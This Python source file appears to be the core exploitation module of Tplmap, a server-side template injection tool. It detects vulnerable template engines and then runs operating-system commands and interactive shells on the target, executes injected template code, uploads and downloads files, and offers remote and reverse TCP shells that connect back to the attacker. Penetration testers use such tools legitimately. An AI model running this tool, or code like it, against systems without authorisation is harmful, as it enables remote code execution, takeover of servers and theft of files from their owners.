from plugins.engines.mako import Mako
from plugins.engines.jinja2 import Jinja2
from plugins.engines.smarty import Smarty
from plugins.engines.twig import Twig
from plugins.engines.freemarker import Freemarker
from plugins.engines.velocity import Velocity
from plugins.engines.jade import Jade
from core.channel import Channel
from utils.loggers import log
from core.clis import Shell, MultilineShell

plugins = [
    Smarty,
    Mako,
    Jinja2,
    Twig,
    Freemarker,
    Velocity,
    Jade
]

def _print_injection_summary(channel):

    prefix = channel.data.get('prefix', '').replace('\n', '\\n')
    render = channel.data.get('render', '%(code)s').replace('\n', '\\n') % ({'code' : '*' })
    suffix = channel.data.get('suffix', '').replace('\n', '\\n')

    idiom = channel.data.get('evaluate')
    if idiom:
        evaluation = 'yes, %s code' % (idiom)
        if channel.data.get('evaluate_blind'):
            evaluation += ' (blind)'
    else:
        evaluation = 'no'

    # Handle execute_blind first since even if it's blind, execute is set as well
    # TODO: fix this? less ambiguity
    if channel.data.get('execute_blind'):
        execution = 'yes (blind)'
    elif channel.data.get('execute'):
        execution = 'yes'
    else:
        execution = 'no'

    log.info("""Tplmap identified the following injection point:

  Engine: %(engine)s
  Injection: %(prefix)s%(render)s%(suffix)s
  Context: %(context)s
  OS: %(os)s
  Technique: %(injtype)s
  Capabilities:
    Code evaluation: %(evaluate)s
    OS command execution: %(execute)s
    File write: %(write)s
    File read: %(read)s
""" % ({
    'prefix': prefix,
    'render': render,
    'suffix': suffix,
    'context': 'text' if (not prefix and not suffix) else 'code',
    'engine': channel.data.get('engine').capitalize(),
    'os': channel.data.get('os', 'undetected'),
    'injtype' : 'blind' if channel.data.get('blind') else 'render',
    'evaluate': evaluation,
    'execute': execution,
    'write': 'no' if not channel.data.get('write') else 'yes',
    'read': 'no' if not channel.data.get('read') else 'yes',
}))

def check_template_injection(channel):

    current_plugin = None

    # Iterate all the available plugins until
    # the first template engine is detected.
    for plugin in plugins:

        current_plugin = plugin(channel)

        # Skip if user specify a specific --engine
        if channel.args.get('engine') and channel.args.get('engine').lower() != current_plugin.plugin.lower():
            continue

        current_plugin.detect()

        if channel.data.get('engine'):
            break

    # Kill execution if no engine have been found
    if not channel.data.get('engine'):
        log.fatal("""Tested parameters appear to be not injectable. Try to increase '--level' value to perform more tests.""")
        return

    # Print injection summary
    _print_injection_summary(channel)

    # If actions are not required, prints the advices and exit
    if not any(
            f for f,v in channel.args.items() if f in (
                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'reverse_tcp_shell'
            ) and v
        ):

        log.info(
            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(tpl_shell)s%(reverse_tpl_shell)s""" % (
                {
                 'execute': '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('execute') else '',
                 'write': '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
                 'read': '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else '',
                 'tpl_shell': '\n    --tcp-shell PORT to run an out-of-bound TCP shell on the remote PORT and connect to it' if channel.data.get('tpl_shell') else '',
                 'reverse_tpl_shell': '\n    --reverse-tcp-shell HOST PORT to run a system shell and connect back to local HOST PORT' if channel.data.get('reverse_tpl_shell') else '',
                 }
            )
        )

        return


    # Execute operating system commands
    if channel.args.get('os_cmd') or channel.args.get('os_shell'):

        # Check the status of command execution capabilities
        if channel.data.get('execute_blind'):
            log.info("""Only blind injection has been found.""")
            log.info("""Commands are executed as '<command> && sleep <delay>' and return True or False whether the delay has been triggered or not.""")

            if channel.args.get('os_cmd'):
                print current_plugin.execute_blind(channel.args.get('os_cmd'))
            elif channel.args.get('os_shell'):
                log.info('Run commands on the operating system')
                Shell(current_plugin.execute_blind, '%s (blind) $ ' % (channel.data.get('os', ''))).cmdloop()

        elif channel.data.get('execute'):
            if channel.args.get('os_cmd'):
                print current_plugin.execute(channel.args.get('os_cmd'))
            elif channel.args.get('os_shell'):
                log.info('Run commands on the operating system')

                Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()

        else:
            log.error('No system command execution capabilities have been detected on the target')


    # Execute template commands
    if channel.args.get('tpl_code') or channel.args.get('tpl_shell'):

        if channel.data.get('engine'):

            if channel.data.get('blind'):
                log.info("""Only blind execution has been found. The injected template code will no return any output.""")
                call = current_plugin.inject
            else:
                call = current_plugin.render

            if channel.args.get('tpl_code'):
                print call(channel.args.get('tpl_code'))
            elif channel.args.get('tpl_shell'):
                log.info('Inject multi-line template code. Press ctrl-D to send the lines')
                MultilineShell(call, '%s > ' % (channel.data.get('engine', ''))).cmdloop()

        else:
                log.error('No code evaluation capabilities have been detected on the target')


    # Perform file upload
    local_remote_paths = channel.args.get('upload')
    if local_remote_paths:

        if channel.data.get('write'):

            local_path, remote_path = local_remote_paths

            with open(local_path, 'rb') as f:
                data = f.read()

            current_plugin.write(data, remote_path)

        else:
                log.error('No file upload capabilities have been detected on the target')

    # Perform file read
    remote_local_paths = channel.args.get('download')
    if remote_local_paths:

        if channel.data.get('read'):

            remote_path, local_path = remote_local_paths

            content = current_plugin.read(remote_path)

            with open(local_path, 'wb') as f:
                f.write(content)

        else:

            log.error('No file download capabilities have been detected on the target')
